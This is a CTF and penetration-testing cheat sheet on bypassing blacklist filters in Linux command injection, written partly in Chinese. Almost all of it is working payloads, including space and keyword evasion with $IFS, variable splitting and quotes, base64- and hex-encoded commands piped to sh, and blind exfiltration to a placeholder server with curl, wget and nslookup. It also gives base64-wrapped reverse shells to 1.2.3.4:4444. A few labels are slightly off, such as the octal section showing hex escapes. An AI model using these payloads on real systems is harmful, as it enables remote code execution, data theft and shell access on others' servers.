# Command Injection Blacklist Bypass — Complete Reference

> Target audience: CTF players & penetration testers facing filtered command injection vulnerabilities.
> Scope: Linux/Unix shell (`bash`, `sh`, `dash`, `zsh`, `busybox sh`).

---

## 1. 快速诊断：先确认注入存在

Before attempting bypasses, **confirm the injection point works**:

| Payload | Expected output |
|---------|-----------------|
| `;id` | `uid=...` appended after normal output |
| `\|id` | `uid=...` (replaces stdout of first cmd) |
| `` `id` `` | Same as above |
| `$(id)` | Same as above |
| `;sleep 5` | Response delayed ~5 seconds |
| `;cat /etc/passwd` | Contents of passwd file |

> **Tip**: Always test with **both** `;` (sequential) and `\|` (pipe) to understand how the backend concatenates your input into the shell command.

---

## 2. Space Bypass (空格绕过)

When the literal space character `0x20` is filtered, use these alternatives.

### 2.1 Shell Variable Substitution (最可靠)

| Technique | Expands to | Requirements |
|-----------|-----------|--------------|
| `$IFS` | space+tab+newline | `$` not filtered |
| `${IFS}` | space+tab+newline | `$`, `{`, `}` not filtered |
| `$IFS$1` | space (then empty `$1`) | `$`, digits not filtered |
| `$IFS$9` | space (then empty `$9`) | `$`, digits not filtered |
| `$IFS${1}` | space | `$`, `{`, `}`, digits not filtered |

> **⚠️ CRITICAL**: `$IFS` directly followed by a letter is parsed as **one variable name**.<br>
> `echo$IFSY2F0...` → shell looks for variable `IFSY2F0...` (undefined → empty).<br>
> **Always** insert `$1` or `$9`: `echo$IFS$1Y2F0...` → `echo Y2F0...`

### 2.2 Tab & Newline (URL-encoded)

| Encoding | Character | Note |
|----------|-----------|------|
| `%09` | Tab (`\t`) | Often not filtered even when space is |
| `%0a` | Newline (`\n`) | Starts a new command line |
| `%0d` | Carriage return (`\r`) | May work in some parsers |

Example:
```
?ip=127.0.0.1;cat%09/flag.txt
?ip=127.0.0.1;cat%0a/flag.txt
```

### 2.3 Brace Expansion (大括号扩展)

```bash
{cat,/flag.txt}        # Expands to: cat /flag.txt
{cat,/etc/passwd}      # Expands to: cat /etc/passwd
```

Requirements: `{` and `}` **not** filtered. Comma `,` usually not checked.

### 2.4 Redirection Operators

```bash
cat</flag.txt          # < redirects file to stdin
cat<>/flag.txt         # <> opens for read+write
```

Requirements: `<` not filtered.

### 2.5 URL-encoded Space in GET Parameters

```
?ip=127.0.0.1%20;cat%20/flag.txt     # %20 = space
?ip=127.0.0.1+;cat+/flag.txt         # + = space in URL query strings
```

> **Note**: Whether `%20` works depends on **when** the filter is applied. If the WAF filters the raw URL before URL-decoding, `%20` might slip through.

---

## 3. Keyword / String Blacklist Bypass (关键字绕过)

When specific keywords (`flag`, `cat`, `bash`, `nc`, etc.) are blocked.

### 3.1 Variable Concatenation (变量拼接) ⭐

Split the forbidden string across variables so the banned **sequence** does not appear in the raw input.

**BYPASSING `flag` FILTER (`.*f.*l.*a.*g.*`)**

```
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```
- Raw string: `a=g;cat$IFS$1fla$a.php`
- Contains `f` (in `fla`), then `l` (in `fla`), then `a` (in `fla`), but **NO `g` after `a`** in order!
- `g` appears only in `a=g` which comes **before** `fla`.
- Shell expands: `fla` + `$a` → `flag`. ✓

**COUNTER-EXAMPLE (FAILS)**:
```
?ip=127.0.0.1;c=fl;d=ag;cat$IFS$1$c$d.php
```
- Raw string contains `c=fl;d=ag` → `f`→`l`→`a`→`g` in order. FILTERED! ✗

**BYPASSING `cat` FILTER**:
```
a=c;b=at;$a$b$IFS$1/flag.txt
```

### 3.2 Quote Sandwich (引号分割)

When quotes are **NOT** filtered:

```bash
c"at" /fl"ag".txt
c'at' /fl'ag'.txt
ca\t /fl\ag.txt       # backslash escape
```

Requirements: `"`, `'`, or `\` not filtered.

### 3.3 Special Variable Substitution (`$@`, `$1`)

```bash
c$1at fl$@ag
c$@at fl$1ag
```
- `$@` and `$1` expand to empty strings in non-function contexts.
- Result: `cat flag`

Requirements: `$` and `@` / digits not filtered.

### 3.4 Wildcards (通配符)

When `?` and `*` are **NOT** filtered:

```bash
cat fla?             # Matches flag, flak, flap, etc.
cat f*               # Matches flag, foo, file, etc.
cat /?lag.txt        # Matches /flag.txt if it's the only match
cat /???/???/???     # Might match /var/www/html
```

> **⚠️ Warning**: Wildcards expand to **all** matching files. If multiple files match, `cat` outputs all of them. Use with care.

---

## 4. Encoding Bypass (编码绕过)

When the raw command string is filtered but you can encode the payload.

### 4.1 Base64 Encoding ⭐

**Step 1**: Encode your command:
```python
import base64
base64.b64encode(b'cat flag.php').decode()    # 'Y2F0IGZsYWcucGhw'
base64.b64encode(b'cat /flag.txt').decode()   # 'Y2F0IC9mbGFnLnR4dA=='
base64.b64encode(b'nc -e /bin/sh 1.2.3.4 4444').decode()
```

**Step 2**: Decode and execute via pipe:
```bash
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
echo$IFS$1Y2F0IC9mbGFnLnR4dA==|base64$IFS$1-d|sh
```

Key points:
- `base64 -d` decodes from stdin.
- `sh` executes the decoded command.
- If `bash` is filtered, use `sh`.
- **No newline** in the base64 string is required for simple commands.

### 4.2 Hex Encoding

```bash
echo$IFS$10x63617420666c6167|xxd$IFS$1-r$IFS$1-p|sh
```
- `0x63617420666c6167` = hex for `cat flag`
- `xxd -r -p` converts hex to binary.

Python helper:
```python
'cat flag'.encode().hex()   # '63617420666c6167'
```

### 4.3 Octal Encoding (printf)

```bash
$(printf$IFS$1"\x63\x61\x74\x20\x66\x6c\x61\x67")
```

Alternative with brace expansion:
```bash
{printf,",\x63\x61\x74\x20\x66\x6c\x61\x67"}|$0
```
- `$0` refers to the current shell (e.g., `/bin/sh` or `bash`).

### 4.4 Rot13 / Caesar (rare but effective)

If `tr` is available and the filter doesn't check for `tr`:
```bash
echo "png synt" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Decodes to: cat flag
```

---

## 5. Inline Execution (内联执行)

Use the output of one command as the argument to another.

### 5.1 Backticks (反引号)

```bash
cat `ls`              # cat $(ls) — executes ls, uses output as arg
cat `ls *.php`        # cat flag.php index.php
```

Requirements: `` ` `` not filtered.

### 5.2 Command Substitution `$()`

```bash
cat $(ls)
cat $(ls *.php)
```

Requirements: `(` and `)` not filtered.

### 5.3 Process Substitution `<()`

```bash
cat <(ls)
```

Requirements: `<`, `(`, `)` not filtered.

### 5.4 `eval` and `$0`

```bash
eval$IFS$1"cat flag"
$0$IFS$1-c$IFS$1"cat flag"     # $0 is the shell itself
```

---

## 6. Shell Feature Exploitation (Shell 特性利用)

### 6.1 `$0` — The Shell Itself

`$0` expands to the current shell path (e.g., `/bin/sh`, `bash`). Can be used to spawn a new shell:

```bash
$0$IFS$1-c$IFS$1"cat flag"
```

### 6.2 Parameter Expansion Tricks

```bash
${PATH:0:1}          # First char of $PATH → usually '/'
${PWD:0:1}           # First char of $PWD → usually '/'
${HOME:0:1}          # First char of $HOME → usually '/'
```

Useful when `/` is filtered:
```bash
cat ${PATH:0:1}flag.txt     # → cat /flag.txt
```

### 6.3 Reverse String with `rev`

If a string is filtered but its reverse is not:
```bash
echo "php.galf" | rev        # → flag.php
cat $(echo "php.galf" | rev)  # → cat flag.php
```

### 6.4 `awk` / `sed` / `cut`

```bash
awk$IFS$1'BEGIN{system("cat flag")}'
sed$IFS$1-n$IFS$1'p'$IFS$1flag.txt   # if sed available
```

Requirements: `awk` or `sed` available on target.

### 6.5 `tac` — Reverse `cat`

```bash
tac$IFS$1flag.txt        # Reads file bottom-to-top
```

Requirements: `tac` installed (most Linux distros have it).

### 6.6 `more` / `less` / `head` / `tail` / `nl` / `od`

```bash
more flag.txt
less flag.txt
head flag.txt
tail flag.txt
nl flag.txt
od flag.txt              # Octal dump
strings flag.php         # Extract printable strings
```

Useful when `cat` is filtered.

### 6.7 `find` with `-exec`

```bash
find$IFS$1/$IFS$1-name$IFS$1flag.txt$IFS$1-exec$IFS$1cat$IFS$1{}$IFS$1\;
```

Requirements: `find` available, `-exec` not blocked.

### 6.8 `xargs`

```bash
echo$IFS$1flag.txt|xargs$IFS$1cat
echo$IFS$1"Y2F0IGZsYWcudHh0"|base64$IFS$1-d|xargs$IFS$1sh$IFS$1-c
```

---

## 7. Alternative Shells & Interpreters

When `bash` or `sh` is restricted:

| Command | Notes |
|---------|-------|
| `sh` | If `bash` is blocked, `sh` often works |
| `dash` | Debian/Ubuntu default `/bin/sh` |
| `zsh` | May have different security policies |
| `python` / `python3` | `python -c 'import os; os.system("cat flag")'` |
| `perl` | `perl -e 'system("cat flag")'` |
| `ruby` | `ruby -e 'system("cat flag")'` |
| `php` | `php -r 'system("cat flag");'` |
| `awk` | `awk 'BEGIN{system("cat flag")}'` |
| `lua` | `lua -e 'os.execute("cat flag")'` |

Example (Python):
```bash
python$IFS$1-c$IFS$1"import os;os.system('cat flag.php')"
```

---

## 8. No-Output / Blind Injection Techniques

When the command executes but produces no visible output.

### 8.1 Time-Based Detection

```bash
;sleep 5                    # Delay = command executed
;sleep$(cat flag|wc -c)     # Delay proportional to file size
```

### 8.2 DNS / HTTP Exfiltration (OAST)

```bash
;curl$IFS$1http://YOUR_SERVER/?f=$(cat flag|base64)
;wget$IFS$1-O-$IFS$1-http://YOUR_SERVER/?f=$(cat flag|base64)
;ping$IFS$1-c$IFS$11$IFS$1$(cat flag).YOUR_SERVER
;nslookup$IFS$1$(cat flag).YOUR_SERVER
```

Requirements: `curl`, `wget`, `ping`, or `nslookup` available and outbound connectivity allowed.

### 8.3 File-Based Exfiltration

If you can write to web root:
```bash
;cat flag > /var/www/html/out.txt
;cat flag > /tmp/out.txt
```
Then visit `http://target/out.txt`.

---

## 9. Common WAF / Filter Bypass Patterns

### 9.1 Case Variation

If filter is **case-sensitive** (no `/i` flag in regex):
```bash
Cat /Flag.Txt              # C vs c, F vs f
CAT /FLAG.TXT
BaSh -c "cat flag"         # If only lowercase 'bash' is blocked
```

### 9.2 Double URL Encoding

If the filter runs **before** URL decoding:
```
?ip=127.0.0.1%253Bcat%2520flag    # %25 = %, so decodes to ;cat%20flag
```

Then the second decode happens: `;cat flag`.

### 9.3 Unicode Normalization

Some parsers normalize Unicode characters:
```
?ip=127.0.0.1;ｃａｔ flag        # Fullwidth characters
```

### 9.4 Null Byte Injection (legacy PHP < 5.3.4)
```
?page=flag.php%00.txt
```

---

## 10. Practical Decision Tree (实战决策树)

```
1. Confirm injection exists (id, sleep, whoami)
   │
   ├── YES → 2. Read source code if possible (index.php, source code leak)
   │          │
   │          ├── Source obtained → analyze exact regex filters
   │          │                     └── Craft targeted bypass
   │          │
   │          └── No source → systematically probe filters:
   │               ├── Test space: ;echo hello → fxck space?
   │               ├── Test symbols: ;echo$(id) → fxck symbol?
   │               ├── Test keywords: ;cat flag → fxck flag?
   │               └── Test bash: ;bash -c id → fxck bash?
   │
   └── NO → Not command injection; switch to SQLi/XSS/LFI/etc.

2. Space filtered?
   ├── $IFS$1 works? → Use it
   ├── ${IFS} works? → Use it (but check { } not filtered)
   ├── %09 (tab)? → Try it
   ├── {cmd,arg}? → Use brace expansion
   └── All blocked? → Try encoding (base64, hex)

3. Keyword filtered (flag, cat, bash)?
   ├── Variable concat possible? → a=g;cat fla$a.php
   ├── Quotes available? → c"at" fl"ag"
   ├── Base64 available? → echo BASE64|base64 -d|sh
   ├── Wildcards available? → cat fla?
   └── Alternative commands? → tac, more, strings, head

4. Symbols filtered ((), {}, <>, *, ?)
   ├── | (pipe) available? → Yes, almost always works for chaining
   ├── ; available? → Sequential execution
   ├── $IFS available? → Space substitute without { }
   └── Base64 + pipe + sh → Universal fallback
```

---

## 11. Payload Cheat Sheet (速查表)

### 11.1 Read flag.php (universal base64)

```bash
# Encode: base64.b64encode(b'cat flag.php').decode()
# Payload:
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

### 11.2 Read flag.php (variable concat)

```bash
a=g;cat$IFS$1fla$a.php
```

### 11.3 Read /flag.txt (brace expansion)

```bash
{cat,/flag.txt}
```

### 11.4 Reverse shell (base64 encoded)

```python
# Python encode:
base64.b64encode(b'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1').decode()
```

```bash
# Payload:
echo$IFS$1YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ==|base64$IFS$1-d|sh
```

### 11.5 Exfiltrate flag via DNS

```bash
;cat flag|xxd -p|head -c 63|tr -d '\n'|xargs -I {} nslookup {}.YOUR_SERVER
```

### 11.6 Write to web root (if writable)

```bash
;cat flag>/var/www/html/x.txt
```

---

## 12. Known CTF Challenges Reference

| Challenge | Type | Key Filter | Working Bypass |
|-----------|------|-----------|----------------|
| [GXYCTF2019] Ping Ping Ping | cmdi | space, symbols, `bash`, `.*f.*l.*a.*g.*` | `echo$IFS$1BASE64\|base64$IFS$1-d\|sh` or `a=g;cat$IFS$1fla$a.php` |
| [ACTF2020] Exec | cmdi | basic | `;cat /flag` |
| [SUCTF2019] EasyWeb | cmdi | spaces, backticks | `$IFS` substitution |
| [RoarCTF2019] Easy Calc | cmdi | char blacklist | Hex encoding via `chr()` in PHP |
| [BUUCTF] Online Tool | cmdi | `flag`, spaces | Variable concat |

---

## 13. Common Mistakes to Avoid

1. **Don't assume `$IFS` alone works**: `echo$IFShello` fails because `$IFShello` is parsed as one variable. Use `$IFS$1`.

2. **Don't forget the entire payload is checked**: Variable concat must ensure the forbidden **sequence** does not appear anywhere in the raw string. `c=fl;d=ag` contains `f→l→a→g`.

3. **Base64 strings can still be filtered**: Some WAFs check for base64 patterns. If so, use hex or octal encoding.

4. **Newline in base64 matters for multi-line commands**: For single commands like `cat flag.php`, no newline is needed. For multi-line scripts, ensure `\n` is included in the encoded string.

5. **Don't rely on `bash` being available**: Many CTFs explicitly filter `bash`. Always try `sh` first.

6. **Always read the source first when possible**: `index.php`, `source.txt`, or error messages often leak the exact regex pattern, saving dozens of blind guesses.
